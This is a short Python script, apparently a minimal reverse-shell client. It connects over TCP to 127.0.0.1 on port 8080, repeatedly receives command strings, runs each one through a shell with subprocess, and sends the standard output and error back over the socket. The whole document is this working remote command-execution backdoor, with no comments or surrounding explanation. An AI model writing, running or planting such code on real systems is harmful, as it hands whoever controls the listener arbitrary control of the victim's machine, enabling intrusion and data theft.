import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 8080))

while True:
    command = s.recv(1024).decode()
    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = CMD.stdout.read()

    if output != b"":
        s.send( output )
    else:
        s.send( "__no_output".encode() )
    s.send( CMD.stderr.read() )
